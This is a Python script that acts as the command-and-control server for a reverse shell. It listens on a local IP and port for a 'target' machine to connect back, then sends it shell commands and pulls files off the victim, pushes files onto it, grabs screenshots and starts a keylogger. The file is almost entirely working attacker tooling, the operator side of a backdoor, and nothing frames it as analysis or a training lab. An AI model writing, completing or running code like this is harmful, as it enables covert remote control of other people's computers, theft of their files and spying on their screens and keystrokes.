#!/usr/bin/env python3

import socket, json, base64

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('windows-1252'))

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + str(target.recv(1024).decode('windows-1252'))
            return json.loads(json_data)
        except ValueError:
            continue
    
def server():
    global s, ip, target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.0.15", 9001))
    s.listen(5)
    print("Listening for incoming connections...")
    target, ip = s.accept()
    print("Target connected!")

def shell():
    count = 1
    while True:
        command = input("* Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = reliable_recv()
                file.write(base64.b64decode(result))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()).decode('utf-8'))
            except:
                failed = "Failed to upload"
                reliable_send(base64.b64encode(failed.decode('utf-8')))
        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as sc:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    sc.write(image_decoded)
                    print("[+] Screenshot performed!")
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)

server()
shell()
s.close()
